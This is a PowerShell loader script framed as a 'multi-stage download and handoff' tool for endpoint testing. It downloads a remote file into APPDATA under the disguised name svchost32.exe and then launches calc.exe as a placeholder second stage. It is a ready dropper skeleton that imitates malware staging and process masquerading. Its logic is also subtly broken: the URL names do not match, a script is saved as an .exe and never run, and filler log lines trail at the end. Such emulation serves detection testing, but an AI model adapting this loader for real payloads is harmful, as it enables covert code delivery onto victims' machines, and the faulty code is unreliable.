<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://internal.corp/stage1.ps1',
    [string]$WorkingPath = "$env:APPDATA\svchost32.exe",
    [string]$ActivityLog = "$env:TEMP\transfer.log",
    [int]$StageTimeout = 216
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 216
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $OperationResult = Invoke-Stage1Download -SourceUrl $Stage2Url -DestinationPath $WorkingPath -TimeoutSec $StageTimeout
    if ($OperationResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $WorkingPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $Stage2Url
    Destination = $WorkingPath
    TimeoutSec = $StageTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Applying operation timeout"
Write-Verbose "Retry budget remaining"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Stage handoff finished"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Operation completed"
Write-Verbose "Exporting operation report"
Write-Verbose "Preparing working directory"
$ProgressPreference = "SilentlyContinue"
Set-Location -Path $env:TEMP
